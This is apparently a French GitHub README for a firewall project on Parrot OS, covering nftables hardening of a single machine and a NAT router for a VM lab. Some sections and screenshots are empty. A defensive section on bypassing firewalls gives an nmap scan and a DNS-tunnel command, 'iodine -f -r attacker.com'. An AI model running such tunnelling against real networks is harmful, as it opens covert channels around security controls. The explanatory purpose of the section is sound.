## Projet Firewall — Parrot OS

Ce projet présente la configuration de pare-feux avancés sous **Parrot Security OS**, une distribution orientée **pentest** et **protection de la vie privée/anonymat**.

Les démonstrations portent sur les niveaux suivants :

- **Niveau 6 — nftables (avancé, machine seule)**
- **Niveau 7 — nftables (NAT/Lab, routeur pour un lab de VM)**

## Pourquoi Parrot OS ?

- Distribution orientée **pentest** et **vie privée/anonymat**.
- Le pare-feu **UFW** est installé par défaut mais désactivé → à activer/configurer par l’utilisateur.
- Intègre des outils de confidentialité (Tor, Anonsurf, OnionShare).
- Plus légère que Kali, adaptée aux **machines modestes** et virtualisation (VirtualBox, VMware).

---

## Niveau 6 (standalone, machine personnelle protégée)
# Mon projet

Voici une capture d’écran :

![Capture écran]https://private-user-images.githubusercontent.com/212772486/480572376-83cf4167-38cb-48c6-b4f3-608e79c749f1.PNG?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTU3OTAzMTUsIm5iZiI6MTc1NTc5MDAxNSwicGF0aCI6Ii8yMTI3NzI0ODYvNDgwNTcyMzc2LTgzY2Y0MTY3LTM4Y2ItNDhjNi1iNGYzLTYwOGU3OWM3NDlmMS5QTkc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjUwODIxJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI1MDgyMVQxNTI2NTVaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT01NGE2Yzg3MjRjYTgwNDBmMGRlZjkxMGIxM2U2MjAzOTUyZTc3ZGJhYmNlYTdiMWYwY2MwZGY4ODFhYzZmNTU0JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.ctm6Id916CaWY6KCf1d-3-XnVy_Lt8VsCHLjbep29D0

## Niveau 7 (NAT / Lab, machine routeur en VM)

---

# 📌 Explications

- **Niveau 6** → protège spécifiquement ta machine personnelle.
- **Niveau 7** → transforme ta machine en pare-feu et routeur pour un réseau virtuel.

 Exemple de capture d’écran (nftables actif en niveau 6) :
![Capture d’écran Niveau 6](images/niveau6.png)

 Exemple de capture d’écran (nftables NAT/routeur niveau 7) :
![Capture d’écran Niveau 7](images/niveau7.png)

---

#  Démonstrations

➡️ **Application des règles** :

---
# ⚠️ Limites et bonnes pratiques

Un pare-feu réduit la surface d’attaque, mais **il ne protège pas de tout**.
Un attaquant expérimenté peut toujours tenter de :

- Passer par un service autorisé (ex : **SSH, HTTPS**).
- Exploiter une **faille applicative**.
- Utiliser du **tunneling** (DNS, HTTPS).
- Contourner via **IPv6** si mal configuré.

👉 **Conclusion :**
Un firewall seul n’est pas suffisant.
Il doit être combiné avec :
- un **IDS/IPS** (Snort, Suricata),
- du **monitoring** (logs, SIEM),
- et des **bonnes pratiques** : MFA, mises à jour régulières, segmentation réseau, durcissement système.

---

# ⚠️ Comment un hacker pourrait contourner

Même avec un firewall avancé (niveaux 6 et 7), il existe des **techniques de contournement** :

- 🔓 **Exploiter les ports ouverts**
(ex : `nmap -p 443 <cible>` ➝ scanner en HTTPS).

-  **Tunneling DNS**
(ex : `iodine` ➝ transformer DNS en canal de communication).

-  **Exploiter des failles applicatives** derrière un port autorisé.

---

👉 **C’est pourquoi un firewall seul ne suffit pas** :
il faut le **combiner avec IDS/IPS + monitoring**.

---

### 📌 Exemple : Tunnel DNS (contournement)

Comme le port **53 (DNS)** est ouvert, un attaquant peut établir un tunnel DNS :

iodine -f -r attacker.com

---

#  Différence entre Niveau 6 et Niveau 7

### 🔹 Niveau 6 : Pare-feu personnel
- Protège uniquement **ta machine locale**.
- Applique une politique stricte : **tout est bloqué sauf quelques services essentiels**.
- Idéal pour un **poste de travail** ou un **serveur isolé**.

👉 **Exemple :** ton PC sous Parrot OS n’accepte que le trafic **web** et **SSH**.

---

### 🔹 Niveau 7 : Pare-feu réseau
- Ta machine devient un **routeur + firewall**.
- Protèger **un réseau interne entier**.
- Ajouter le **forwarding et NAT**.

# ✅ Conclusion

Parrot OS est une alternative solide à Kali Linux : plus légère, orientée vie privée et adaptée aux environnements pentest.

Les niveaux 6 et 7 démontrent deux cas concrets :

**Protection avancée d’une machine individuelle** (standalone) 
**Mise en place d’un routeur/firewall complet** pour un lab réseau.

👉 Ce projet illustre comment un firewall peut évoluer :
d’une **simple protection locale** ➝ vers un **composant réseau avancé**.

---

#  Technologies utilisées

- Parrot OS
- nftables
- VirtualBox

---

✍️ Auteur : *Virginie Lechene*








